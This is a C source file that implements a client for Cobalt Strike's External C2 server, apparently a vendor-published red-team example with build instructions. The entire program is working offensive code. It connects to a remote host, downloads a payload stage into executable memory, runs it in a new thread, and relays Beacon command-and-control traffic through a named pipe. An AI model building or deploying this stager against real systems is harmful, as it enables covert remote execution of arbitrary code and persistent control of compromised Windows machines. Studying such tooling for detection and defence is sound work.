/*

Copyright 2016-2025 Fortra, LLC

Redistribution and use in source and binary forms, with or without modification, are permitted provided that the 
following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following 
disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following 
disclaimer in the documentation and/or other materials provided with the distribution.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, 
INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE 
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, 
SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, 
WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE 
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

*/

/*
 * Build:
 * i686-w64-mingw32-gcc extc2example.c -o example.exe -lws2_32
 */

/* a quick-client for Cobalt Strike's External C2 server */
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>

#define PAYLOAD_MAX_SIZE 512 * 1024
#define BUFFER_MAX_SIZE 1024 * 1024

/* read a frame from a handle */
DWORD read_frame(HANDLE my_handle, char * buffer, DWORD max) {
	DWORD size = 0, temp = 0, total = 0;

	/* read the 4-byte length */
	ReadFile(my_handle, (char *)&size, 4, &temp, NULL);

	/* read the whole thing in */
	while (total < size) {
		ReadFile(my_handle, buffer + total, size - total, &temp, NULL);
		total += temp;
	}

	return size;
}

/* receive a frame from a socket */
DWORD recv_frame(SOCKET my_socket, char * buffer, DWORD max) {
	DWORD size = 0, total = 0, temp = 0;

	/* read the 4-byte length */
	recv(my_socket, (char *)&size, 4, 0);

	/* read in the result */
	while (total < size) {
		temp = recv(my_socket, buffer + total, size - total, 0);
		total += temp;
	}

	return size;
}

/* send a frame via a socket */
void send_frame(SOCKET my_socket, char * buffer, int length) {
	send(my_socket, (char *)&length, 4, 0);
	send(my_socket, buffer, length, 0);
}

/* write a frame to a file */
void write_frame(HANDLE my_handle, char * buffer, DWORD length) {
	DWORD wrote = 0;
	WriteFile(my_handle, (void *)&length, 4, &wrote, NULL);
	WriteFile(my_handle, buffer, length, &wrote, NULL);
}

/* the main logic for our client */
void go(char * host, DWORD port) {
	/*
	 * connect to the External C2 server
	 */

	/* copy our target information into the address structure */
	struct sockaddr_in 	sock;
	sock.sin_family = AF_INET;
	sock.sin_addr.s_addr = inet_addr(host);
	sock.sin_port = htons(port);

	/* attempt to connect */
	SOCKET socket_extc2 = socket(AF_INET, SOCK_STREAM, 0);
	if ( connect(socket_extc2, (struct sockaddr *)&sock, sizeof(sock)) ) {
		printf("Could not connect to %s:%d\n", host, port);
		exit(0);
	}

	/*
	 * send our options
	 */
	send_frame(socket_extc2, "arch=x86", 8);
	send_frame(socket_extc2, "pipename=foobar", 15);
	send_frame(socket_extc2, "block=100", 9);

	/*
	 * request + receive + inject the payload stage
	 */

	/* request our stage */
	send_frame(socket_extc2, "go", 2);

	/* receive our stage */
	char * payload = VirtualAlloc(0, PAYLOAD_MAX_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	recv_frame(socket_extc2, payload, PAYLOAD_MAX_SIZE);

	/* inject the payload stage into the current process */
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID) NULL, 0, NULL);

	/*
	 * connect to our Beacon named pipe
	 */
	HANDLE handle_beacon = INVALID_HANDLE_VALUE;
	while (handle_beacon == INVALID_HANDLE_VALUE) {
		Sleep(1000);
		handle_beacon = CreateFileA("\\\\.\\pipe\\foobar", GENERIC_READ | GENERIC_WRITE,
			0, NULL, OPEN_EXISTING, SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, NULL);
	}

	/* setup our buffer */
	char * buffer = (char *)malloc(BUFFER_MAX_SIZE); /* 1MB should do */

	/*
	 * relay frames back and forth
	 */
	while (TRUE) {
		/* read from our named pipe Beacon */
		DWORD read = read_frame(handle_beacon, buffer, BUFFER_MAX_SIZE);
		if (read < 0) {
			break;
		}

		/* write to the External C2 server */
		send_frame(socket_extc2, buffer, read);

		/* read from the External C2 server */
		read = recv_frame(socket_extc2, buffer, BUFFER_MAX_SIZE);
		if (read < 0) {
			break;
		}

		/* write to our named pipe Beacon */
		write_frame(handle_beacon, buffer, read);
	}

	/* close our handles */
	CloseHandle(handle_beacon);
	closesocket(socket_extc2);
}

void main(DWORD argc, char * argv[]) {
	/* check our arguments */
	if (argc != 3) {
		printf("%s [host] [port]\n", argv[0]);
		exit(1);
	}

	/* initialize winsock */
	WSADATA wsaData;
	WORD    wVersionRequested;
	wVersionRequested = MAKEWORD(2, 2);
	WSAStartup(wVersionRequested, &wsaData);

	/* start our client */
	go(argv[1], atoi(argv[2]));
}
